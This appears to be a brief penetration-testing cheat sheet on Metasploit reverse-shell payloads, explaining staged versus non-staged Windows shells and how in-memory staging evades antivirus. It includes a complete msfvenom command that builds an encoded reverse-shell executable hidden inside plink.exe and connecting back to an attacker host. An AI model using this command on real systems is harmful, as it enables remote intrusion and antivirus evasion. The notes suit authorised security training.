# Payloads
## Staged vs Non Staged

```
windows/shell_reverse_tcp - Connect back to attacker and spawn a command shell
windows/shell/reverse_tcp - Connect back to attacker, Spawn cmd shell (staged)
```

### Non Staged
```
windows/shell_reverse_tcp
All Payload is sent in one go.
```

### Staged
```
windows/shell/reverse_tcp
meterpreter/
# Part of payload is sent initially, resulting in less shellcode space, 
# also will evade antivirus, as malicious part is sent later andinto ram only
# Meterpreter is a staged payload. The second stage is a 750k DLL file that is
# injected directly into memory. As the DLL file never touches the victim file
# system, it is less likely to be detected by antivirus software.
```

Commonly used Payloads
```
# injecting to exe, evading antivirus
msfvenom -p windows/shell_reverse_tcp LHOST=10.x.x.x LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe 
```
